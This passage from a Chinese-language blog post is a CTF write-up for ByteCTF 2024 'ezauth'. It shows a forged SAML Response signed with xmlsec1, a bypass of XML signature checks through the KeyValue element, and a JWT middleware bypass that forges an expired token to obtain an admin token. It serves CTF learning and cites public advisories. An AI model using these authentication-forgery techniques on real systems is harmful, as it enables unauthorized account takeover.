&lt;samlsig:KeyValue&gt;MIIDazCCAlOgAwIBAgIUexfKkWtRKAWRvcfzl7/MnrZIyQAwDQYJKoZIhvcNAQELBQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yNDExMTExMjIyNDZaFw0yNzA4MDgxMjIyNDZaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC2FYuexjL80KhiWeBnTLMCi38g9tho+bhlM0TA3q1ziA5E4oE0pYrHBl1BqxyqtN/Xfb/0CZyry4Hvv/FRpL2C/SsQ7EMJZM3zo4B4iejK4H+jaSNc8T9BWuqnL/d7rpBvB5xA8SrhooM62tGGHOVIaa1ZZP41KS+MQzQudOQsG7rGJa0325EqI8WdsFUvnGgxlWK5M0WyBEtk8kCOVcCx9ONmuDoLsLSDZwwfef5mzuZuvA7A7nvLI90r42MU3g1aopW5pqWPk7mvwh87BGmYzCHz1LN/2mgwC0J8bVx9qM9MLWTkut2GrUgQoxpU7h7XNmReBfdZW+U2lFTr/Ta3AgMBAAGjUzBRMB0GA1UdDgQWBBQNRP2woqWf9nWytFX48shBrWkqIzAfBgNVHSMEGDAWgBQNRP2woqWf9nWytFX48shBrWkqIzAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQBpL+lPyfIQoJIqdI/QcNlFX3h6KwJDUk9XwUT6tmOr19mTvQ4FNQMOITLkRAdj1pPDHGq80EUdt+V5dxmSPoAGco4tuzgdHViw5S/TQd3m38Q/oIeJouxC31N8GuLlD8RWzJYMrru+cXVX7nhDKE33pUTfqTWjh7keUMp8wbk1K1fMfkAy+U8XOwYnRnkuNxO2GZwnobrvFhSctJSFzDjOxMfp4F+/STPoUCwFkdYazESGpwfd8n8vFIpTgVNPen7py3xGM6XT8uWl99o5m8lQRBP/wTyqE0lIlaLB8F7OHHjZU4TiuPDm8On1UigrBBSdkTzBjTVJ0e8fdfkceoW7&lt;/samlsig:KeyValue&gt;</span><br><span class="line">            &lt;samlsig:X509Data&gt;</span><br><span class="line">                &lt;samlsig:X509Certificate&gt;MIIDazCCAlOgAwIBAgIUexfKkWtRKAWRvcfzl7/MnrZIyQAwDQYJKoZIhvcNAQELBQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yNDExMTExMjIyNDZaFw0yNzA4MDgxMjIyNDZaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC2FYuexjL80KhiWeBnTLMCi38g9tho+bhlM0TA3q1ziA5E4oE0pYrHBl1BqxyqtN/Xfb/0CZyry4Hvv/FRpL2C/SsQ7EMJZM3zo4B4iejK4H+jaSNc8T9BWuqnL/d7rpBvB5xA8SrhooM62tGGHOVIaa1ZZP41KS+MQzQudOQsG7rGJa0325EqI8WdsFUvnGgxlWK5M0WyBEtk8kCOVcCx9ONmuDoLsLSDZwwfef5mzuZuvA7A7nvLI90r42MU3g1aopW5pqWPk7mvwh87BGmYzCHz1LN/2mgwC0J8bVx9qM9MLWTkut2GrUgQoxpU7h7XNmReBfdZW+U2lFTr/Ta3AgMBAAGjUzBRMB0GA1UdDgQWBBQNRP2woqWf9nWytFX48shBrWkqIzAfBgNVHSMEGDAWgBQNRP2woqWf9nWytFX48shBrWkqIzAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQBpL+lPyfIQoJIqdI/QcNlFX3h6KwJDUk9XwUT6tmOr19mTvQ4FNQMOITLkRAdj1pPDHGq80EUdt+V5dxmSPoAGco4tuzgdHViw5S/TQd3m38Q/oIeJouxC31N8GuLlD8RWzJYMrru+cXVX7nhDKE33pUTfqTWjh7keUMp8wbk1K1fMfkAy+U8XOwYnRnkuNxO2GZwnobrvFhSctJSFzDjOxMfp4F+/STPoUCwFkdYazESGpwfd8n8vFIpTgVNPen7py3xGM6XT8uWl99o5m8lQRBP/wTyqE0lIlaLB8F7OHHjZU4TiuPDm8On1UigrBBSdkTzBjTVJ0e8fdfkceoW7&lt;/samlsig:X509Certificate&gt;</span><br><span class="line">            &lt;/samlsig:X509Data&gt;</span><br><span class="line">        &lt;/samlsig:KeyInfo&gt;</span><br><span class="line">    &lt;/samlsig:Signature&gt;</span><br><span class="line">    &lt;samlp:Status&gt;</span><br><span class="line">        &lt;samlp:StatusCode Value=&quot;urn:oasis:names:tc:SAML:2.0:status:Success&quot;&gt;&lt;/samlp:StatusCode&gt;</span><br><span class="line">    &lt;/samlp:Status&gt;</span><br><span class="line">    &lt;saml:Assertion ID=&quot;_132ebb3f-a299-42c8-5960-f21bed10cce7&quot; Version=&quot;2.0&quot; xmlns:xs=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:saml=&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot; IssueInstant=&quot;2024-11-12T03:10:59.041740369Z&quot;&gt;</span><br><span class="line">        &lt;saml:Issuer&gt;http://localhost:8000/saml&lt;/saml:Issuer&gt;</span><br><span class="line">        &lt;saml:Subject&gt;</span><br><span class="line">            &lt;saml:NameID Format=&quot;urn:oasis:names:tc:SAML:2.0:nameid-format:transient&quot;&gt;userIdThatYouAuthenticated&lt;/saml:NameID&gt;</span><br><span class="line">            &lt;saml:SubjectConfirmation Method=&quot;urn:oasis:names:tc:SAML:2.0:cm:bearer&quot;&gt;</span><br><span class="line">                &lt;saml:SubjectConfirmationData InResponseTo=&quot;authnRequestIdRespondingTo&quot; NotOnOrAfter=&quot;2024-11-12T03:15:59.04174105Z&quot; Recipient=&quot;http://localhost:8000/saml_consume&quot;&gt;&lt;/saml:SubjectConfirmationData&gt;</span><br><span class="line">            &lt;/saml:SubjectConfirmation&gt;</span><br><span class="line">        &lt;/saml:Subject&gt;</span><br><span class="line">        &lt;saml:Conditions NotBefore=&quot;2024-11-12T03:05:59.041741731Z&quot; NotOnOrAfter=&quot;2024-11-12T03:15:59.041742162Z&quot;&gt;&lt;/saml:Conditions&gt;</span><br><span class="line">        &lt;saml:AttributeStatement&gt;</span><br><span class="line">            &lt;saml:Attribute Name=&quot;uid&quot; NameFormat=&quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic&quot;&gt;</span><br><span class="line">                &lt;saml:AttributeValue xsi:type=&quot;xs:string&quot;&gt;userIdThatYouAuthenticated&lt;/saml:AttributeValue&gt;</span><br><span class="line">            &lt;/saml:Attribute&gt;</span><br><span class="line">            &lt;saml:Attribute Name=&quot;email&quot; NameFormat=&quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic&quot;&gt;</span><br><span class="line">                &lt;saml:AttributeValue xsi:type=&quot;xs:string&quot;&gt;someone@domain&lt;/saml:AttributeValue&gt;</span><br><span class="line">            &lt;/saml:Attribute&gt;</span><br><span class="line">        &lt;/saml:AttributeStatement&gt;</span><br><span class="line">    &lt;/saml:Assertion&gt;</span><br><span class="line">&lt;/samlp:Response&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xmlsec1 --sign --privkey-pem /home/kali/Desktop/bytectf2024_ezauth/key.pem --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response --output signed-idp2sp6.xml idp2sp6.xml</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xmlsec1 --verify --pubkey-cert-pem /home/kali/Desktop/bytectf2024_ezauth/frntn-x509-san.crt --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response signed-idp2sp6.xml</span><br></pre></td></tr></table></figure>

<p>然后就通了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/bytectf2024_ezauth]</span><br><span class="line">└─# xmlsec1 --sign --privkey-pem /home/kali/Desktop/bytectf2024_ezauth/key.pem --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response --output signed-idp2sp6.xml idp2sp6.xml</span><br><span class="line">func=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=389:obj=x509-store:subj=unknown:error=71:certificate verification failed:X509_verify_cert: subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; issuer=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; err=18; msg=self-signed certificate</span><br><span class="line">func=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=432:obj=x509-store:subj=unknown:error=71:certificate verification failed:subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; issuer=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; err=18; msg=self-signed certificate</span><br><span class="line">                                                                                                                                                                                                                               </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/bytectf2024_ezauth]</span><br><span class="line">└─# xmlsec1 --verify --pubkey-cert-pem /home/kali/Desktop/bytectf2024_ezauth/frntn-x509-san.crt --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response signed-idp2sp6.xml</span><br><span class="line">OK</span><br><span class="line">SignedInfo References (ok/all): 1/1</span><br><span class="line">Manifests References (ok/all): 0/0</span><br><span class="line">                                                                                                                                                                                                                               </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/bytectf2024_ezauth]</span><br><span class="line">└─# xmlsec1 --verify  --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response signed-idp2sp6.xml </span><br><span class="line">OK</span><br><span class="line">SignedInfo References (ok/all): 1/1</span><br><span class="line">Manifests References (ok/all): 0/0</span><br><span class="line">                                     </span><br></pre></td></tr></table></figure>

<p>不过很疑问，为什么X509Certificate不行？非常的迷惑，但有一点被我忽视的文章，里面也确确实实用到了KeyValue。</p>
<p>即<a target="_blank" rel="noopener" href="https://github.com/RyanBoomer30/CVE-2021-21239-Exploit/blob/main/main.py">CVE-2021-21239-Exploit&#x2F;main.py at main · RyanBoomer30&#x2F;CVE-2021-21239-Exploit</a>里的</p>
<pre><code>key_info = ET.SubElement(new_signature, &#39;KeyInfo&#39;)
key_value = ET.SubElement(key_info, &#39;KeyValue&#39;)
</code></pre>
<h3 id="为什么X509不行？"><a href="#为什么X509不行？" class="headerlink" title="为什么X509不行？"></a>为什么X509不行？</h3><p>实际上不是X509不行，在规范上是允许X509的，但是xmlsec1不认</p>
<blockquote>
<p>To sign a XML document we need two things:<br>要对 XML 文档进行签名，我们需要两样东西：</p>
<ul>
<li>The private key. 私钥。</li>
<li>The XML document to sign, but it should be a XML signing template. That means a XML that in addition of your data has the necesarry information needed to sign (which algorithms, which signing mode, which key and so on…).<br>要签名的 XML 文档，但它应该是 XML 签名模板。这意味着 XML 除了您的数据之外，还具有签名所需的必要信息（哪些算法、哪种签名模式、哪个密钥等等……</li>
</ul>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://users.dcc.uchile.cl/~pcamacho/tutorial/web/xmlsec/xmlsec.html#htoc7">使用 XMLSec 进行 XML 签名和 XML 加密简介 — An Introduction to XML Signature and XML Encryption with XMLSec</a></p>
<p>WM大佬们对 response.Signature.KeyInfo.KeyValue.Value赋值</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.Signature.KeyInfo.KeyValue.Value = cert</span><br></pre></td></tr></table></figure>

<p>赋值没有起作用，真正起作用的是建立这个结构。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;KeyInfo&gt;</span><br><span class="line">   &lt;KeyValue /&gt;</span><br></pre></td></tr></table></figure>

<p>xmlsec1识别到这个结构，随即将公钥存储在其中。我们是用私钥加密，可能流程是</p>
<ol>
<li>xmlsec1 sign</li>
<li>xmlsec1 scan2get Keyinfo</li>
<li>xmlsec1 generate public key</li>
<li>xmlsec1 put public key</li>
</ol>
<p>回过头看，test.xml中，也正是因为有这个结构，才能通过自带证书签名。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;KeyInfo&gt;</span><br><span class="line">    &lt;KeyValue/&gt;</span><br><span class="line">&lt;/KeyInfo&gt;</span><br></pre></td></tr></table></figure>

<p>总之，我们这一部分问题解决了。</p>
<p>让我们添加一下 来收尾</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Keyvalue: Keyvalue&#123;</span><br><span class="line">	XMLName: xml.Name&#123;</span><br><span class="line">		Local: &quot;samlsig:KeyValue&quot;,</span><br><span class="line">	&#125;,</span><br><span class="line">	value: &quot;&quot;,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<h2 id="如何绕过jwt"><a href="#如何绕过jwt" class="headerlink" title="如何绕过jwt"></a>如何绕过jwt</h2><p>下发的jwt是guest，获取flag需要是admin</p>
<p>jwt校验的中间件 先解析jwt ，如果过期，则重新签名。没有其他逻辑</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">		if err != nil &amp;&amp; !errors.Is(err, jwt.ErrTokenExpired) &#123;</span><br><span class="line">		if err != nil &amp;&amp; errors.Is(err, jwt.ErrTokenExpired) &#123;</span><br><span class="line">两个不同的判断条件，怎么进入二</span><br></pre></td></tr></table></figure>

<p>怎么err报错且过期</p>
<p>跟jwt的parse逻辑</p>
<p><img src="/../imgs/$%7Bfiilename%7D/1731393175901.png" alt="1731393175901">W&amp;M这里的流程是 </p>
<p><img src="/../imgs/$%7Bfiilename%7D/(null)-20240922140136146.(null)" alt="img"></p>
<p>但是我本地看版本不一样了。 改了。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/golang-jwt/jwt/commit/7b1c1c00a171c6c79bbdb40e4ce7d197060c1c2c#diff-83eb8e32639d01cf443d6d8bde24c1c8be78766090d8c5f8586c36250cfedca6">Merge commit from fork · golang-jwt&#x2F;jwt@7b1c1c0</a></p>
<p>改了。(<em>^_^</em>)</p>
<p>回退一下</p>
<p><img src="/../imgs/$%7Bfiilename%7D/1731394143308.png" alt="1731394143308"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// Valid validates time based claims &quot;exp, iat, nbf&quot;. There is no accounting for clock skew.</span><br><span class="line">// As well, if any of the above claims are not in the token, it will still</span><br><span class="line">// be considered a valid claim.</span><br><span class="line">func (c StandardClaims) Valid() error &#123;</span><br><span class="line">	vErr := new(ValidationError)</span><br><span class="line">	now := TimeFunc().Unix()</span><br><span class="line"></span><br><span class="line">	// The claims below are optional, by default, so if they are set to the</span><br><span class="line">	// default value in Go, let&#x27;s not fail the verification for them.</span><br><span class="line">	if !c.VerifyExpiresAt(now, false) &#123;</span><br><span class="line">		delta := time.Unix(now, 0).Sub(time.Unix(c.ExpiresAt, 0))</span><br><span class="line">		vErr.Inner = fmt.Errorf(&quot;%s by %s&quot;, ErrTokenExpired, delta)</span><br><span class="line">		vErr.Errors |= ValidationErrorExpired</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if !c.VerifyIssuedAt(now, false) &#123;</span><br><span class="line">		vErr.Inner = ErrTokenUsedBeforeIssued</span><br><span class="line">		vErr.Errors |= ValidationErrorIssuedAt</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if !c.VerifyNotBefore(now, false) &#123;</span><br><span class="line">		vErr.Inner = ErrTokenNotValidYet</span><br><span class="line">		vErr.Errors |= ValidationErrorNotValidYet</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if vErr.valid() &#123;</span><br><span class="line">		return nil</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return vErr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先看payload里面的过期没过期，那我们可以伪造一个过期时间，让validate 时间时候就报错 ，这样不会verify看我们的用户对不对，我们可以跳到过期重新签发，签admin的权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MzE5OTkzODQsImlzcyI6ImJ5dGVjdGYiLCJ1c2VybmFtZSI6Imd1ZXN0In0.AtIpqfF1oxYs46_8AJaDHVe63wbzVcVslYS9IJgLZds</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/$%7Bfiilename%7D/image-20241112150901372.png" alt="image-20241112150901372"></p>
<p>改payload，时间 减去7 * 24  * 3600 + 1   即过期，user改admin，签名不用改。</p>
<p>那么问题来了。这个题不用生成jwt就可以呀</p>
<p>题目并没有做限制，如果服务端时区设置不一样，爆破也能爆破出一个合理的过期时间。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><a target="_blank" rel="noopener" href="https://docs.google.com/document/d/157fGn7lLP1uBuRz8zUgRDWTDklKznljeOWwRQ-C6uFg/edit?usp=sharing">CVE-2021-21239 Report - Google Docs</a></p>
<p><a target="_blank" rel="noopener" href="https://securitylab.github.com/advisories/GHSL-2023-121_go-saml__archived_/">GHSL-2023-121: SAML authentication bypass vulnerability in RobotsAndPencils&#x2F;go-saml - CVE-2023-48703 | GitHub Security Lab</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/RobotsAndPencils/go-saml">RobotsAndPencils&#x2F;go-saml: A just good enough SAML client library written in Go.</a></p>
<p><a target="_blank" rel="noopener" href="https://users.dcc.uchile.cl/~pcamacho/tutorial/web/xmlsec/xmlsec.html#htoc7">使用 XMLSec 进行 XML 签名和 XML 加密简介 — An Introduction to XML Signature and XML Encryption with XMLSec</a></p>
<p><a target="_blank" rel="noopener" href="https://www.samltool.com/generic_sso_res.php">SAML Response Examples - SAML Assertion Example | SAMLTool.com</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.wm-team.cn/index.php/archives/81/#ezauth">ByteCTF 2024 By W&amp;M - W&amp;M Team</a></p>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2024/11/10/%E9%B9%8F%E5%9F%8E%E6%9D%AF2024%20java/" rel="prev" title="鹏城杯 2024 java">
      <i class="fa fa-chevron-left"></i> 鹏城杯 2024 java
    </a></div>
      <div class="post-nav-item">
    <a href="/2024/11/11/hello-world/" rel="next" title="Hello World">
      Hello World <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B4%A8%E9%87%8F%E8%B6%85%E9%AB%98%E7%9A%84%E4%B8%80%E9%A2%98%EF%BC%8C%E8%80%8C%E4%B8%94%E5%BE%88%E6%9C%89%E6%84%8F%E6%80%9D%E3%80%82"><span class="nav-number">1.</span> <span class="nav-text">质量超高的一题，而且很有意思。</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BA%90%E7%A0%81"><span class="nav-number">2.</span> <span class="nav-text">源码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E9%80%89%E6%8B%A9"><span class="nav-number">3.</span> <span class="nav-text">环境选择</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">4.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SAML-%E6%9C%AF%E8%AF%AD"><span class="nav-number">4.1.</span> <span class="nav-text">SAML 术语</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">5.</span> <span class="nav-text">分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#acs"><span class="nav-number">5.1.</span> <span class="nav-text">&#x2F;acs</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#admin"><span class="nav-number">5.2.</span> <span class="nav-text">&#x2F;admin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jwt%E8%AE%A4%E8%AF%81%E4%B8%AD%E9%97%B4%E4%BB%B6"><span class="nav-number">5.3.</span> <span class="nav-text">jwt认证中间件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E4%BC%AA%E9%80%A0idp-sp-%EF%BC%9F"><span class="nav-number">5.4.</span> <span class="nav-text">如何伪造idp-&gt;sp ？</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%A4%E5%AF%B9%E5%AF%86%E9%92%A5"><span class="nav-number">5.4.1.</span> <span class="nav-text">两对密钥</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#idp"><span class="nav-number">5.4.2.</span> <span class="nav-text">idp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sp"><span class="nav-number">5.4.3.</span> <span class="nav-text">sp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%A5%E9%94%991"><span class="nav-number">5.4.4.</span> <span class="nav-text">报错1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%A5%E9%94%992"><span class="nav-number">5.4.5.</span> <span class="nav-text">报错2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%9F%E8%BF%9B%E7%AD%BE%E5%90%8D%E9%80%BB%E8%BE%91%E7%9C%8B%E7%9C%8B"><span class="nav-number">5.4.6.</span> <span class="nav-text">跟进签名逻辑看看</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B9idp"><span class="nav-number">5.4.7.</span> <span class="nav-text">改idp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%A5%E9%94%993"><span class="nav-number">5.4.8.</span> <span class="nav-text">报错3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%A5%E9%94%994"><span class="nav-number">5.4.9.</span> <span class="nav-text">报错4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%A5%E9%94%995"><span class="nav-number">5.4.10.</span> <span class="nav-text">报错5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%A5%E9%94%996"><span class="nav-number">5.4.11.</span> <span class="nav-text">报错6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88X509%E4%B8%8D%E8%A1%8C%EF%BC%9F"><span class="nav-number">5.4.12.</span> <span class="nav-text">为什么X509不行？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87jwt"><span class="nav-number">5.5.</span> <span class="nav-text">如何绕过jwt</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">5.6.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Charger0</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">7</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Charger0</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
